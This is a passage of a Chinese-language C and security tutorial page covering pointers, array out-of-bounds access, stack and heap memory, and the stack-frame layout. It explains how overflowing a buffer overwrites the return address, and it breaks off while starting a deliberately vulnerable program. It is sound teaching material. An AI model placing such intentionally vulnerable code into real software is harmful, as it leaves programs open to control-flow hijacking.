+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">10</span><span class="p">;</span>
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">a</span><span class="p">;</span><span class="w">    </span><span class="c1">// p 指向 a</span>
+<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>
+<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;=== 看看 a 和 p 的关系 ===</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;a 的值: %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">a</span><span class="p">);</span>
+<a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;a 的地址: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">a</span><span class="p">);</span>
+<a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;p 的值(存的地址): %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">p</span><span class="p">);</span>
+<a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;p 自己的地址: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">p</span><span class="p">);</span><span class="w">   </span><span class="c1">// 指针本身也有地址！</span>
+<a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;*p (解引用): %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">p</span><span class="p">);</span>
+<a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a>
+<a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">=== 通过指针修改 a 的值 ===</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a><span class="w">    </span><span class="o">*</span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">999</span><span class="p">;</span><span class="w">   </span><span class="c1">// 通过指针修改变量</span>
+<a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;修改后 a 的值: %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">a</span><span class="p">);</span><span class="w">   </span><span class="c1">// a 变成 999 了！</span>
+<a id="__codelineno-9-17" name="__codelineno-9-17" href="#__codelineno-9-17"></a>
+<a id="__codelineno-9-18" name="__codelineno-9-18" href="#__codelineno-9-18"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">=== 指针大小 ===</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<a id="__codelineno-9-19" name="__codelineno-9-19" href="#__codelineno-9-19"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;int* 的大小: %zu 字节</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">));</span>
+<a id="__codelineno-9-20" name="__codelineno-9-20" href="#__codelineno-9-20"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;char* 的大小: %zu 字节</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">));</span>
+<a id="__codelineno-9-21" name="__codelineno-9-21" href="#__codelineno-9-21"></a><span class="w">    </span><span class="c1">// 64位系统上，所有类型的指针都是 8 字节——因为地址是 64 位的</span>
+<a id="__codelineno-9-22" name="__codelineno-9-22" href="#__codelineno-9-22"></a><span class="p">}</span>
+</code></pre></div>
+<h3 id="_11">🧪 小实验<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h3>
+<ol>
+<li>把 <code>*p = 999</code> 改成 <code>*p = 0</code>，看看 a 的值跟着变了吗？</li>
+<li>声明一个 <code>int *q;</code> 但不初始化，然后打印 <code>*q</code>。<strong>程序崩溃了吗？</strong> 这就是未初始化指针的危险——它指向一个随机地址，读写它可能导致段错误，也可能悄无声息地破坏了别人的数据。</li>
+</ol>
+<h3 id="_12">⚠️ 常见误区<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>❌ <strong>误区：</strong> "指针很复杂，是一种特殊的数据类型"
+✅ <strong>真相：</strong> 指针就是<strong>存地址的整数</strong>。在 64 位系统上，指针就是一个 64 位无符号整数。所谓 <code>int*</code>、<code>char*</code> 的区别只是告诉编译器"这个地址处的数据，按 int 的格式解读"还是"按 char 的格式解读"。底层都是地址。</p>
+<p>❌ <strong>误区：</strong> "学了指针就是为了写链表/树"
+✅ <strong>真相：</strong> 在安全领域，指针的意义是：<strong>你可以通过指针访问内存中的任意位置</strong>——包括你不该访问的位置。理解指针 = 理解"程序为什么能越权访问"。</p>
+</blockquote>
+<hr />
+<h2 id="3">3. 数组和指针——其实是一回事<a class="headerlink" href="#3" title="Permanent link">&para;</a></h2>
+<h3 id="_13">🏪 生活场景：街道门牌号系统<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h3>
+<p>一条街上有 100 栋房子，每栋房子有门牌号。门牌号从 100 号开始，到 199 号。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>arr[0] → 100 号房子
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>arr[1] → 101 号房子（100 + 1）
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>arr[2] → 102 号房子（100 + 2）
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>...
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>arr[i] → (100 + i) 号房子
+<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>
+<a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>如果你问 arr[150]：
+<a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>  → 100 + 150 = 250 号房子
+<a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a>  → 但这条街只到 199 号！
+<a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a>  → 你走进了隔壁工厂的大门
+<a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a>  → C 语言不会阻止你——它直接走进去看里面有什么
+</code></pre></div>
+<p>这就是数组越界的本质：你拿了一个合法的起始地址，但走了太远。</p>
+<h3 id="_14">🔍 技术原理<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="kt">int</span><span class="w"> </span><span class="n">arr</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">10</span><span class="p">,</span><span class="w"> </span><span class="mi">20</span><span class="p">,</span><span class="w"> </span><span class="mi">30</span><span class="p">,</span><span class="w"> </span><span class="mi">40</span><span class="p">,</span><span class="w"> </span><span class="mi">50</span><span class="p">};</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="c1">// arr 本身是什么？——它就是这个数组的起始地址！</span>
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="c1">// 下面四个表达式完全等价：</span>
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="n">arr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="w">      </span><span class="c1">// 正常写法：第 3 个元素</span>
+<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="o">*</span><span class="p">(</span><span class="n">arr</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w">  </span><span class="c1">// arr 是地址，+2 表示往后走 2 个 int</span>
+<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a><span class="o">*</span><span class="p">(</span><span class="mi">2</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">arr</span><span class="p">)</span><span class="w">  </span><span class="c1">// 加法交换律</span>
+<a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a><span class="mi">2</span><span class="p">[</span><span class="n">arr</span><span class="p">]</span><span class="w">      </span><span class="c1">// 因为 *(2+arr) 和 arr[2] 一样，所以 2[arr] 也能用！（别这样写）</span>
+</code></pre></div>
+<p><strong>arr[i] 实际做的事：</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>arr[i] = 从 arr 地址出发，走 i × sizeof(元素类型) 个字节，取出那里的值
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>arr[0] → 从 arr 出发，走 0×4=0 字节   → 取 10
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>arr[1] → 从 arr 出发，走 1×4=4 字节   → 取 20
+<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>arr[100] → 从 arr 出发，走 100×4=400 字节 → 取……天知道什么东西
+</code></pre></div>
+<h3 id="_15">图解：数组在内存中的布局<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>int arr[5] = {10, 20, 30, 40, 50};
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>地址: arr      arr+4    arr+8    arr+12   arr+16    arr+20 (越界！)
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>      ↓        ↓        ↓        ↓        ↓         ↓
+<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>      ┌────────┬────────┬────────┬────────┬────────┬───?───┐
+<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>      │   10   │   20   │   30   │   40   │   50   │  ???  │
+<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>      └────────┴────────┴────────┴────────┴────────┴───?───┘
+<a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>        arr[0]   arr[1]   arr[2]   arr[3]   arr[4]   arr[5] (越界访问！)
+</code></pre></div>
+<h3 id="_16">💻 动手写代码<a class="headerlink" href="#_16" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">arr</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">10</span><span class="p">,</span><span class="w"> </span><span class="mi">20</span><span class="p">,</span><span class="w"> </span><span class="mi">30</span><span class="p">,</span><span class="w"> </span><span class="mi">40</span><span class="p">,</span><span class="w"> </span><span class="mi">50</span><span class="p">};</span>
+<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>
+<a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;=== 数组和指针的等价关系 ===</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;arr 的地址: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">arr</span><span class="p">);</span>
+<a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;&amp;arr[0] 的地址: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+<a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a><span class="w">    </span><span class="c1">// 这两个地址一样！arr 就是首元素地址</span>
+<a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a>
+<a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">=== 用不同方式访问第 3 个元素 ===</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;arr[2]   = %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">arr</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+<a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;*(arr+2) = %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="n">arr</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">2</span><span class="p">));</span>
+<a id="__codelineno-14-14" name="__codelineno-14-14" href="#__codelineno-14-14"></a><span class="w">    </span><span class="c1">// printf(&quot;2[arr]   = %d\n&quot;, 2[arr]);  // 也能用，但永远别这样写</span>
+<a id="__codelineno-14-15" name="__codelineno-14-15" href="#__codelineno-14-15"></a>
+<a id="__codelineno-14-16" name="__codelineno-14-16" href="#__codelineno-14-16"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">=== ⚠️ 越界访问（危险！不要在实际代码中这样做） ===</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<a id="__codelineno-14-17" name="__codelineno-14-17" href="#__codelineno-14-17"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;arr[5]   = %d  ← 这已经越界了！取到的是栈上的随机值</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">arr</span><span class="p">[</span><span class="mi">5</span><span class="p">]);</span>
+<a id="__codelineno-14-18" name="__codelineno-14-18" href="#__codelineno-14-18"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;arr[100] = %d  ← 远远越界！可能读到任何东西</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">arr</span><span class="p">[</span><span class="mi">100</span><span class="p">]);</span>
+<a id="__codelineno-14-19" name="__codelineno-14-19" href="#__codelineno-14-19"></a>
+<a id="__codelineno-14-20" name="__codelineno-14-20" href="#__codelineno-14-20"></a><span class="w">    </span><span class="c1">// 下面这行如果取消注释，很可能会段错误（Segmentation Fault）</span>
+<a id="__codelineno-14-21" name="__codelineno-14-21" href="#__codelineno-14-21"></a><span class="w">    </span><span class="c1">// arr[1000000] = 42;  // 写了不该写的地方！</span>
+<a id="__codelineno-14-22" name="__codelineno-14-22" href="#__codelineno-14-22"></a>
+<a id="__codelineno-14-23" name="__codelineno-14-23" href="#__codelineno-14-23"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<a id="__codelineno-14-24" name="__codelineno-14-24" href="#__codelineno-14-24"></a><span class="p">}</span>
+</code></pre></div>
+<h3 id="_17">🧪 小实验<a class="headerlink" href="#_17" title="Permanent link">&para;</a></h3>
+<p>用循环遍历 arr 的"邻居"——看看数组前后各有什么：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="kt">int</span><span class="w"> </span><span class="n">arr</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">10</span><span class="p">,</span><span class="w"> </span><span class="mi">20</span><span class="p">,</span><span class="w"> </span><span class="mi">30</span><span class="p">,</span><span class="w"> </span><span class="mi">40</span><span class="p">,</span><span class="w"> </span><span class="mi">50</span><span class="p">};</span>
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="n">printf</span><span class="p">(</span><span class="s">&quot;越界向前看 5 个 int:</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-5</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;arr[%d] = %d (地址: %p)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="n">arr</span><span class="p">[</span><span class="n">i</span><span class="p">],</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">arr</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a><span class="p">}</span>
+<a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a><span class="c1">// 这些地址里存的是栈上的其他数据——可能是其他局部变量</span>
+</code></pre></div>
+<h3 id="_18">⚠️ 常见误区<a class="headerlink" href="#_18" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>❌ <strong>误区：</strong> "C 语言数组越界会报错"
+✅ <strong>真相：</strong> C 语言<strong>不检查数组越界</strong>。这是设计哲学：信任程序员。代价是——如果你犯了错，程序不会告诉你，它只是默默读写了不该碰的内存。这就是大多数安全漏洞的根源。</p>
+</blockquote>
+<hr />
+<h2 id="4-stackheap">4. 📌 栈（Stack）和堆（Heap）——程序的两种内存<a class="headerlink" href="#4-stackheap" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>⚠️ <strong>这是全书最重要的一节。</strong> 栈的结构理解不透，07 章二进制安全就完全看不懂。请反复看栈帧图，直到能在白纸上不看笔记默画出来。</p>
+</blockquote>
+<h3 id="vs">🏪 生活场景：餐厅洗盘子 vs 仓库取货<a class="headerlink" href="#vs" title="Permanent link">&para;</a></h3>
+<p><strong>栈 = 餐厅后厨的盘子摞</strong></p>
+<p>服务员收盘子回来，把脏盘子往上一摞（push）。洗碗工从最上面拿盘子洗（pop）。<strong>后进先出（LIFO）</strong>——最后摞上去的盘子最先被拿走。</p>
+<ul>
+<li>盘子摞的高度由餐厅的盘子总数决定（栈大小固定，通常 8MB）</li>
+<li>你不需要知道盘子具体在哪个位置——只需要操作最上面那个（RSP 栈顶指针）</li>
+<li>如果盘子摞太高，超过了盘子总数——啪！栈溢出（Stack Overflow）！</li>
+</ul>
+<p><strong>堆 = 仓库货架</strong></p>
+<p>你去仓库管理员那儿说"我要一块这么大的空地"（malloc），管理员说"第 3 排第 5 层给你"。用完你要告诉管理员"我用完了，还给你"（free）。忘记还？那就是<strong>内存泄漏</strong>——仓库空间被占着但没人用。</p>
+<table>
+<thead>
+<tr>
+<th>特性</th>
+<th>栈 Stack（盘子摞）</th>
+<th>堆 Heap（仓库）</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>怎么分配</td>
+<td>自动——函数进来就有，出去就没了</td>
+<td>手动——你要就要，不要记得还</td>
+</tr>
+<tr>
+<td>大小限制</td>
+<td>小（约 8MB），超出 = 栈溢出</td>
+<td>大（受物理内存 + 虚拟内存限制）</td>
+</tr>
+<tr>
+<td>速度</td>
+<td>极快（只需移动一个指针）</td>
+<td>较慢（要搜索空闲块）</td>
+</tr>
+<tr>
+<td>管理方式</td>
+<td>编译器自动插入 push/pop</td>
+<td>程序员手动 malloc/free</td>
+</tr>
+<tr>
+<td>增长方向</td>
+<td>高地址→低地址（向下长）</td>
+<td>低地址→高地址（向上长）</td>
+</tr>
+<tr>
+<td>典型错误</td>
+<td>栈溢出（覆盖返回地址）</td>
+<td>内存泄漏、堆溢出、Use-After-Free</td>
+</tr>
+</tbody>
+</table>
+<h3 id="_19">🔍 技术原理：栈帧结构<a class="headerlink" href="#_19" title="Permanent link">&para;</a></h3>
+<p><strong>这是整个知识库最重要的一张图。</strong> 每次调用一个函数，都会在栈上创建一个"栈帧"（Stack Frame）：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>        高地址（地址数字大，图上方）
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>        ┌──────────────────────────┐
+<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>        │  调用者 (main) 的局部变量   │  ← main 的栈帧
+<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>        ├──────────────────────────┤
+<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>        │  传给 func 的参数          │  ← 参数从右向左压栈
+<a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>        │  比如第2个参数: 4          │
+<a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>        │  比如第1个参数: 3          │
+<a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a>        ├──────────────────────────┤
+<a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a>        │  ★ 返回地址 (Return Addr)  │  ← call 指令压入！
+<a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a>        │  func 执行完该回 main 的哪一行？ │  这就是我们要攻击的目标！
+<a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a>        ├──────────────────────────┤
+<a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a>        │  旧的 RBP 值               │  ← main 的栈底指针
+<a id="__codelineno-16-13" name="__codelineno-16-13" href="#__codelineno-16-13"></a>        │  (main 的 rbp 被保存在这)   │     push rbp 压入的
+<a id="__codelineno-16-14" name="__codelineno-16-14" href="#__codelineno-16-14"></a>        ├──────────────────────────┤  ← RBP 指向这里（当前栈帧的&quot;底&quot;）
+<a id="__codelineno-16-15" name="__codelineno-16-15" href="#__codelineno-16-15"></a>        │  func 的局部变量:          │
+<a id="__codelineno-16-16" name="__codelineno-16-16" href="#__codelineno-16-16"></a>        │    buf[15] (最后一个字节)   │     高地址端
+<a id="__codelineno-16-17" name="__codelineno-16-17" href="#__codelineno-16-17"></a>        │    buf[14]                 │
+<a id="__codelineno-16-18" name="__codelineno-16-18" href="#__codelineno-16-18"></a>        │    ...                     │     ↑ buf 从低地址向高地址填充
+<a id="__codelineno-16-19" name="__codelineno-16-19" href="#__codelineno-16-19"></a>        │    buf[0]  (第一个字节)     │     │
+<a id="__codelineno-16-20" name="__codelineno-16-20" href="#__codelineno-16-20"></a>        │    result                  │  ← 其他局部变量
+<a id="__codelineno-16-21" name="__codelineno-16-21" href="#__codelineno-16-21"></a>        ├──────────────────────────┤
+<a id="__codelineno-16-22" name="__codelineno-16-22" href="#__codelineno-16-22"></a>        │  未使用的栈空间             │  ← RSP 指向这里（栈顶）
+<a id="__codelineno-16-23" name="__codelineno-16-23" href="#__codelineno-16-23"></a>        └──────────────────────────┘
+<a id="__codelineno-16-24" name="__codelineno-16-24" href="#__codelineno-16-24"></a>        低地址（地址数字小，图下方）
+</code></pre></div>
+<h3 id="_20">🔥 关键洞察：为什么栈溢出能控制程序？<a class="headerlink" href="#_20" title="Permanent link">&para;</a></h3>
+<p>看上面的图。buf 共 16 字节，从低地址向高地址填充。</p>
+<p><strong>如果你往 buf 里写了超过 16 字节的数据，多出来的字节会：</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>第 17-20 字节 → 覆盖 result（其他局部变量）     ← 可能还好，程序逻辑出错
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>第 21-28 字节 → 覆盖&quot;旧的 RBP&quot;                  ← 破坏了栈帧链
+<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>第 29-36 字节 → ★ 覆盖&quot;返回地址&quot;★               ← 程序的控制权被劫持！
+</code></pre></div>
+<p><strong>func 执行完要返回 main 时，CPU 执行 <code>ret</code> 指令：</strong>
+1. 从栈上"返回地址"的位置取出 8 个字节
+2. 把这 8 个字节当成一个地址
+3. <code>RIP = 这个地址</code>（跳过去执行）</p>
+<p><strong>如果你把这 8 个字节改成了恶意代码的地址——程序就跳去执行你的恶意代码了！</strong></p>
+<h3 id="_21">💻 动手写代码：一个故意栈溢出的程序<a class="headerlink" href="#_21" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
+<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>
+<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="kt">void</span><span class="w"> </span><span class="nf">vulnerable</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span><span class="w">               </span><span class="c1">// 只分配了 16 字节的局部数组</span>
